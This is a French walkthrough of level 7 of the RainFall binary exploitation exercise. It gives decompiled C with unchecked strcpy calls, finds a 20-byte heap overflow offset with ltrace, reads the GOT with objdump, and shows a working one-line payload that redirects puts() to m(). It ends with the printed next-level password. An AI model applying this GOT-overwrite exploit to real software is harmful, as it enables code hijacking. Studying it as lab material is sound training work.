# level 7

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

char buff[80];

void m(void *param1, int param2, char *param3, int param4, int param5)
{
    time_t time;

    time = time((time_t *)NULL);
    printf("%s - %d\n", buff, time);
}

int main(int ac, char **av)
{
    uint *ptr1;
    void *ptr2;
    uint *ptr3;
    FILE *stream;

    ptr1 = malloc(8);
    *ptr1 = 1;
    ptr2 = malloc(8);
    ptr1[1] = ptr2;
    ptr3 = malloc(8);
    *ptr3 = 2;
    ptr2 = malloc(8);
    ptr3[1] = ptr2;

    strcpy((char *)ptr1[1], av[1]);
    strcpy((char *)ptr3[1], av[2]);
    stream = fopen("/home/user/level8/.pass", "r");
    fgets(buff, 68, stream);
    puts("~~");
    return 0;
}
```

L'idee est de changer l'adresse pointee par `ptr3[1]` par l'adresse de `puts()` dans la `GOT`, pour pouvoir ecrire l'adresse de `m()`. Nous allons donc overflow `ptr[1]` pour ceci. Pour connaitre la taille de notre overflow nous pouvons utiliser cette commande:

```bash
ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
__libc_start_main(0x8048521, 2, 0xbffff794, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                     = 0x0804a008
malloc(8)                                                                     = 0x0804a018
malloc(8)                                                                     = 0x0804a028
malloc(8)                                                                     = 0x0804a038
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)                     = 0x0804a018
strcpy(0x37614136, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

Nous voyons que le premier `strcpy()` ecrit dans `0x0804a018` et que nous voulons ecrire dans `0x0804a038` (`ptr3[1]`). Avec une simple soustraction nous obtenons 20.
Ensuite grace a objdump nous pouvons recuperer l'adresse de `puts()`:

```bash
level7@RainFall:~$ objdump -R ./level7

./level7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049904 R_386_GLOB_DAT    __gmon_start__
08049914 R_386_JUMP_SLOT   printf
08049918 R_386_JUMP_SLOT   fgets
0804991c R_386_JUMP_SLOT   time
08049920 R_386_JUMP_SLOT   strcpy
08049924 R_386_JUMP_SLOT   malloc
08049928 R_386_JUMP_SLOT   puts
0804992c R_386_JUMP_SLOT   __gmon_start__
08049930 R_386_JUMP_SLOT   __libc_start_main
08049934 R_386_JUMP_SLOT   fopen
```

Donc pouvons desormais construire notre premier argument:

```bash
python -c 'print "A" * 20 + "\x28\x99\x04\x08"'
```

Ensuite grace a Ghidra nous avons juste a recuperer l'adresse de notre fonction `m()`: `0x080484f4`

Nous avons juste a mettre cette adresse dans notre deuxieme argument:

```bash
level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08 " + "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1787214614
```
